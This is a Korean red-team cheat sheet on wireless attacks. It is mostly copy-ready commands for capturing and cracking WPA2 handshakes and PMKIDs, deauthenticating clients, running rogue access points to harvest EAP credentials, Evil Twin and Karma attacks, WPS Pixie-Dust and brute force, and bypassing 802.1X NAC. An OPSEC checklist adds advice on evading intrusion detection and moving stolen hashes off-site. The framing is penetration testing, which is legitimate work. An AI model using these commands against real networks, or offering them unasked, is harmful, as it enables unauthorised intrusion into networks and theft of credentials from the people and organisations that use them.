# 무선 / WiFi 공격

!!! abstract "개요"
    레드팀 시 **물리 침투/주차장/게스트 AP** 를 통해 내부망으로 진입하는 벡터.  
    WPA2-PSK / WPA2-Enterprise(EAP) / WPS / Evil Twin / Karma 공격을 다룬다.

---

## 사전 준비

| 장비 | 용도 |
|---|---|
| Alfa AWUS036ACH / AWUS036NHA | 모니터 모드 + 패킷 주입 |
| Panda PAU09 | 2.4GHz 안정적 |
| WiFi Pineapple Mark VII | Rogue AP / Karma 자동화 |

```bash
# 인터페이스 모니터 모드 전환
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# 주변 AP 스캔
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
```

---

## WPA2-PSK 크래킹

### 4-way Handshake 캡처

```bash
# 1. 타겟 AP 채널 고정 모니터링
airodump-ng -c 6 --bssid <BSSID> -w handshake wlan0mon

# 2. 연결된 클라이언트 deauth → 재핸드셰이크 유도
aireplay-ng -0 5 -a <BSSID> -c <CLIENT_MAC> wlan0mon

# 3. 크래킹 (hashcat mode 22000 권장)
hcxpcapngtool -o hash.22000 handshake.cap
hashcat -m 22000 hash.22000 rockyou.txt
```

### PMKID (클라이언트 불필요)

```bash
# PMKID 캡처 (AP 혼자서도 가능, deauth 불필요 → OPSEC 우수)
hcxdumptool -i wlan0mon -o pmkid.pcapng --enable_status=1
hcxpcapngtool -o hash.22000 pmkid.pcapng
hashcat -m 22000 hash.22000 wordlist.txt
```

---

## WPA2-Enterprise (EAP) 공격

기업 환경에서 가장 흔한 방식. Radius 서버가 EAP-PEAP/EAP-TTLS/EAP-TLS 로 인증.

```bash
# Rogue AP로 EAP 자격증명 중계 → Radius Hash 탈취
# hostapd-wpe (Wireless Pwnage Edition)
git clone https://github.com/OpenSecurityResearch/hostapd-wpe
hostapd-wpe hostapd-wpe.conf

# 캡처된 NETNTLMv1/v2 형태 hash
# MSCHAPv2 challenge/response → asleap 또는 hashcat -m 5500
asleap -C <challenge> -R <response> -W rockyou.txt
```

!!! tip "EAP-TLS"
    EAP-TLS 는 클라이언트 인증서를 사용하므로 hostapd-wpe 로 자격증명을 얻을 수 없다. 다만 클라이언트가 **서버 인증서 검증(`Validate server certificate`)을 하지 않는 경우** rogue AP에서 `EAP-TTLS` 로 다운그레이드 유도 가능.

---

## Evil Twin / Karma

```bash
# 동일 SSID로 더 강한 신호의 가짜 AP 구성
# 정품 AP는 deauth로 밀어내고 → 피해자가 자동으로 공격자 AP에 연결
airgeddon    # 메뉴 기반 자동화
wifipumpkin3 # Python 기반 Rogue AP + captive portal

# Karma 공격: 클라이언트의 probe request (Preferred Network List) 를 그대로 응답
# → "Starbucks_WiFi" 등 개방 SSID를 자동 제공
```

---

## WPS (구형 가정용 AP)

```bash
# WPS 활성화 AP 스캔
wash -i wlan0mon

# Pixie-Dust (오프라인, 수십초 ~ 몇분)
reaver -i wlan0mon -b <BSSID> -K 1 -vv

# Online Bruteforce (LockOut 주의)
reaver -i wlan0mon -b <BSSID> -vv
bully -b <BSSID> wlan0mon
```

---

## 802.1X NAC 우회 (유선/무선 포트 보안)

```bash
# silent-bridge 또는 nac_bypass
# 정상 기기의 MAC/인증서를 브릿지 경유로 훔쳐 네트워크 진입

# 1. 유선 NAC 우회
git clone https://github.com/scipag/nac_bypass
./nac_bypass_setup.sh -1 eth0 -2 eth1
# eth0 = 타겟 포트, eth1 = 인증된 기기
```

---

## OPSEC 체크리스트

- [ ] 공격자 디바이스 MAC 랜덤화 (`macchanger -r wlan0`)
- [ ] Deauth 는 최소 횟수만 (IDS 에 대량 패킷 감지)
- [ ] Rogue AP 신호 강도는 타겟 AP 와 근사하게 (너무 강하면 직원이 의심)
- [ ] 수집된 hash/자격증명은 오프사이트로 즉시 반출
- [ ] 크래킹은 공격자 VPS 에서 (타겟 와이파이 지역에서 빠른 크래킹 시도 X)

---

## 참고

- 내부망 진입 이후: [내부 정찰](enumeration.md), [횡적 이동](lateral-movement.md)
- 크리덴셜 처리: [Credential Access](credential-access.md)
